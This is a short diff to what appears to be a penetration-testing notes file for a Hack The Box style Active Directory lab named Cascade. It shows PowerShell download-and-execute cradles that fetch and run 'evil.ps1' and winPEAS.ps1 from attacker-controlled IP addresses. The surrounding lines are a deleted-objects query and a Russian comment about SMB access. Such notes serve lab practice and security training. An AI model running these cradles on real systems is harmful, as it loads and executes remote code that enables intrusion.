@@ -31,7 +31,7 @@ Get-ADObject -SearchBase "CN=Deleted Objects,DC=Cascade,DC=Local" -Filter {Objec
 
 IEX(New-Object Net.WebClient).downloadString('http://10.10.14.4/evil.ps1')
 
-echo IEX(New-Object Net.WebClient).downloadString('http://10.10.14.6:8000/winPEAS.ps1') | powershell -noprofile -
+echo IEX(New-Object Net.WebClient).downloadString('http://10.10.14.6:8000/winPEAS.ps1') | powershell -noprofile 
 
 # Доступ к ресурсу SMB
 
